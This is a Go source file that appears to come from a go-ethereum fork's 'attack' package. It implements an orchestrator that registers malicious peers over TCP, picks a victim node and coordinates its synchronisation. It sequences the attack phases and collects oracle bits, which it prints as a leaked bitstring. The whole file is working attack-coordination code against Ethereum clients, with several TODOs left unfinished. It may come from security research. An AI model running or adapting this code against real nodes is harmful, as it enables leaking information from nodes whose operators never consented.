package orchestrator

import "fmt"
import "net"
import "encoding/binary"
import "github.com/ethereum/go-ethereum/attack/buildchain"
import "github.com/ethereum/go-ethereum/attack/msg"
import "github.com/ethereum/go-ethereum/attack/utils"

const (
	ADDR = "localhost"
	PORT = "45678"
)

type Orchestrator struct {
	peerset *PeerSet
	quitCh chan struct{}
	errc chan error
	incoming chan *peerMessage
	victim string
	oracleCh chan byte
	oracleReply []byte
	attackPhase utils.AttackPhase
	chainBuilt bool
	localMaliciousPeers bool
}

func New(errc chan error) *Orchestrator {
	o := &Orchestrator {
		peerset: &PeerSet{
			peers: make(map[string]*Peer),
		},
		quitCh: make(chan struct{}),		// Useless (?) for now as termination upon success/fail is signaled
											// through errc channel
		errc: errc,
		incoming: make(chan *peerMessage),
		oracleCh: make(chan byte),
		attackPhase: utils.StalePhase,
		chainBuilt: false,
		localMaliciousPeers: true,
	}

	return o
}

func (o *Orchestrator) Start(rebuild bool) {
	go o.handleMessages()
	go o.addPeers()
	go func() {
		err := buildchain.BuildChain(utils.PredictionChain, utils.NumBatchesForPrediction*utils.BatchSize+88, rebuild)
		if err != nil {
			o.errc <- err
			o.close()
			return
		}
		o.chainBuilt = true
	}()

	if o.localMaliciousPeers {
		//TODO: Start two peers with 'mgeth'
	}

	fmt.Println("Orchestrator started")
}

func (o *Orchestrator) addPeers() {
	l, err := net.Listen("tcp", ADDR+":"+PORT)
	if err != nil {
		fmt.Println("Error listening on the network")
		o.errc <- err
		return
	}
	defer l.Close()

	for {
		conn, err := l.Accept()
		if err != nil {
			fmt.Println("Error accepting new connection\nerr =", err)
			fmt.Println("Still listening for new peers")
			continue
		}

		buf := make([]byte, 8)
		_, err = conn.Read(buf)
		if err != nil {
			fmt.Println("Error receiving peer's ID\nerr =", err)
			fmt.Println("Still listening for new peers")
			continue
		}

		peerId := string(buf[:])
		peer := &Peer {
			id: peerId,
			conn: conn,
			stop: make(chan struct{}),
		}

		o.peerset.add(peerId, peer)
		fmt.Println("Peer " + peerId + " joined (numPeers:", o.peerset.len(), "\b)")

		//peer.distributeChain(utils.PredictionChain)

		go peer.readLoop(o.incoming, o.quitCh, o.errc)
		
		err = o.initPeer(peer)
		if err != nil {
			fmt.Println("Could not initialize peer correctly")
			o.peerset.remove(peerId)
			continue
		}
		err = o.sendAll(msg.NewMaliciousPeer.SetContent([]byte(peerId)))
		if err != nil {
			fmt.Println("Could not notify new peer to already connected peers")
			o.close()
			o.errc <- err
			return
		}

		if o.peerset.len() >= 2 && o.attackPhase==utils.StalePhase && o.chainBuilt {
			o.attackPhase = utils.ReadyPhase
			err = o.sendAll(msg.SetAttackPhase.SetContent([]byte{byte(o.attackPhase)}))
			if err != nil {
				fmt.Println("Could not notify start of the attack")
				o.close()
				o.errc <- err
				return
			}
			go o.leadAttack()
		}
	}

}

func (o *Orchestrator) leadAttack() {
	//TODO: start leadAttack() immediately and wait here for the two peers
	fmt.Println("Attack ready to go")
	defer o.close()

	for {
		bit := <-o.oracleCh
		fmt.Println("Received new oracle bit")
		o.oracleReply = append(o.oracleReply, bit)
		
		if len(o.oracleReply)==utils.RequiredOracleBits {
			fmt.Println("Leaked bistring:", o.oracleReply)
		}
	}

	o.errc <- nil
}

func (o *Orchestrator) handleMessages() {
	for {
		select {
		case <- o.quitCh:
			return

		case peermsg := <-o.incoming:
			message := peermsg.message
			sender := peermsg.peer

			switch message.Code {
			case msg.BatchRequestServed.Code:
				err := o.send(o.peerset.masterPeer, message)
				if err != nil {
					o.errc <- err
					o.close()
					return
				}
			case msg.MasterPeer.Code:
				o.peerset.masterPeer = sender
			case msg.SetVictim.Code:
				victimID := string(message.Content)
				if o.victim == "" {
					o.victim = victimID
					fmt.Println("Found new victim: " + victimID)
				} else if o.victim != victimID {
					fmt.Println("Something wrong happened setting victim ID: oldID = " + o.victim + ", newID = "+ victimID)
					o.errc <- utils.ParameterErr
					o.close()
					return
				}
				fmt.Println("Master peer " + o.peerset.masterPeer.id + " is now leading victim sync")
				err := o.sendAllExcept(message, sender)
				if err != nil {
					o.errc <- err
					o.close()
					return
				}
			case msg.SetAttackPhase.Code:
				o.attackPhase = utils.AttackPhase(message.Content[0])
				go o.sendAllExcept(message, sender)
			}
		}
	}
}

func (o *Orchestrator) Wait() {
	<-o.quitCh
	return
}

func (o *Orchestrator) initPeer (p *Peer) error {
	for id, _ := range o.peerset.peers {
		err := o.send(p, msg.NewMaliciousPeer.SetContent([]byte(id)))
		if err != nil {
			return err
		}
	}

	buf := make([]byte, 4)
	binary.BigEndian.PutUint32(buf, utils.NumBatchesForPrediction)
	err := o.send(p, msg.SetNumBatches.SetContent(buf))
	return err
}

func (o *Orchestrator) send(p *Peer, message *msg.Message) error {
	buf := message.Encode()
	n, err := p.conn.Write(buf)
	if err != nil {
		return err
	}
	if n < len(buf) {
		return utils.PartialSendErr
	}
	return nil
}

func (o *Orchestrator) sendAllExcept(message *msg.Message, toExclude *Peer) error {
	for _, peer := range o.peerset.peers {
		if peer.id == toExclude.id {
			continue
		}
		if err := o.send(peer, message); err != nil {
			return err
		}
	}

	return nil
}

func (o *Orchestrator) sendAll(message *msg.Message) error {
	for _, peer := range o.peerset.peers {
		if err := o.send(peer, message); err != nil {
			return err
		}
	}

	return nil
}

func (o *Orchestrator) close() {
	close(o.quitCh)
	close(o.incoming)
	o.peerset.close()
	return
}


